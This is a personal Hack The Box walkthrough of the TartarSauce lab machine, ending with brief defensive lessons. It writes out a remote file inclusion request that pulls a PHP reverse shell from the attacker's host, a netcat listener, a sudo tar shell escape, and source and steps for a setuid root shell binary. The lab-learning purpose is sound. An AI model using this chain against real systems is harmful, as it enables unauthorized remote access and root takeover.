# 🐟 TartarSauce – HTB Walkthrough

### 🛍️ Enumeration

#### 🔍 Port Scanning

Only port `80` was open:

```
http://10.10.10.88/
```

We find a`robots.txt` at:

```
http://10.10.10.88/robots.txt
```

This hints at `/webservices`.

#### 🔎 Directory Bruteforce

We run Gobuster on `/webservices`:

```
gobuster dir -u http://10.10.10.88/webservices -w /usr/share/dirb/wordlists/common.txt
```

It reveals:

```
/webservices/wp/
```

Which is a WordPress installation.

***

### ⚙️ WordPress Enumeration

We use WPScan to enumerate plugins:

```
wpscan --url http://10.10.10.88/webservices/wp/
```

We identify the vulnerable plugin: `Gwolle Guestbook`.

The Above was what I, was supposed to do. but even after running WPScan i did not get the plugin (i had to look at a walkthrough to get this part)

***

### 🪨 Exploitation - Gaining Shell (RFI)

#### 🔄 Crafting the Payload

We use the standard PHP reverse shell:

```
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shellwp-load.php
```

Start a web server:

```
python3 -m http.server 8000
```

Then trigger the RFI:

```
curl -s "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.22:8000/shell"
```

Catch the shell:

```
nc -lvnp 9331
```

We land as `www-data`.

***

### 🪍 Escalating to Onuma

Run `sudo -l` as `www-data` reveals:

```
(ALL) NOPASSWD: /bin/tar (as onuma)
```

Use GTFOBins’ tar exploit:

```
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Get TTY:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=tmux-256color
stty rows 46 columns 211
```

Now we’re `onuma`.

***

### ⬆️ Root Privilege Escalation

PS, this section took me almost 2 days. I tried giving it my all, coming after work to solve it, but I couldn't get through. Finally, today (on Sunday morning), after I dedicatedly sat and tried to understand it, I was able to solve it&#x20;

We discover a suspicious systemd timer (via LinPEAS):

```
watch -n 1 'systemctl list-timers'
```

It points to `/usr/sbin/backuperer`, a custom backup script running as **root** every few minutes.

#### 📂 Vulnerability in `backuperer`

The script:

* Archives `/var/www/html` to a random file in `/var/tmp/`
  *

      <figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
* Waits 30 seconds
*

    <figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
* Extracts the archive to `/var/tmp/check`
  *

      <figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
* If the integrity check fails, it **doesn't delete the extracted files**
* All of this runs as root

#### 🚩 Exploit Plan

We compile a **setuid root binary**:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(void) {
    setreuid(0, 0);
    system("/bin/sh");
}
```

> I built this on a Docker container running Ubuntu 16.04 (same as the TartarSauce box).

```
docker run -it ubuntu:16.04 bash
```

```
# Run this in the docker container
apt update && apt upgrade -y
apt install gcc nano
apt install -y gcc-multilib
```

Compile the SUID binary:

```
# in dokcer
gcc -m32 -o suid suid.c
```

Structure the payload:

```
# on your maching as root
mkdir -p var/www/html
chmod 4755 suid
cp suid var/www/html/
tar -zcvf exp.tar.gz var/
```

Deliver to the target:

```
curl -o exp.tar.gz http://10.10.14.22:8000/exp.tar.gz
```

Overwrite the temp file created by `backuperer`:(happens every 5 min)

```
cp exp.tar.gz .<matching_tempfile>
```

Wait \~30s. The backup script will extract `exp.tar.gz` to `/var/tmp/check/var/www/html`.

Then:

```
cd /var/tmp/check/var/www/html
./suid
```

Make sure to use `sh` not `bash` to retain SUID privileges.

Boom. Root shell.

***

### 🔒 Defensive Learnings

* **Code hygiene matters:** The script didn’t clean up the `check` directory on integrity failure.
* **Use effective privilege separation:** Line 36 should’ve checked as `onuma`, not as `root`.
  *

      <figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
*

***

### 📌 Appendix&#x20;



* backup script

```bash
basedir=/var/www/html                                                                                                                             
bkpdir=/var/backups                                                                                                                               
tmpdir=/var/tmp                                                                                                                                   
testmsg=$bkpdir/onuma_backup_test.txt                                                                                                             
errormsg=$bkpdir/onuma_backup_error.txt                                                                                                           
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)                                                                       
check=$tmpdir/check      
# formatting                                                                                                                                      
printbdr()                                                                                                                                        
{                                                                                                                                                 
    for n in $(seq 72);                                                                                                                           
    do /usr/bin/printf $"-";                                                                                                                      
    done                                                                                                                                          
}                                                                                                                                                 
bdr=$(printbdr)                                                                                                                                   
                                                                                                                                                  
# Added a test file to let us see when the last backup was run                                                                                    
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg                                              
                                                                                                                                                  
# Cleanup from last time.                                                                                                                         
/bin/rm -rf $tmpdir/.* $check                                                                                                                     
                                                                                                                                                  
# Backup onuma website dev files.                                                                                                                 
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &                                                                                         
  
# Added delay to wait for backup to complete if large files get added.                                                                    [0/1989]
/bin/sleep 30               
                                    
# Test the backup integrity
integrity_chk()    
{                                                                        
    /usr/bin/diff -r $basedir $check$basedir                                                                                                      
}                                                                                                        
                                    
/bin/mkdir $check            
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]           
then                                                                     
    # Report errors so the dev can investigate the issue.                                               
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi

```
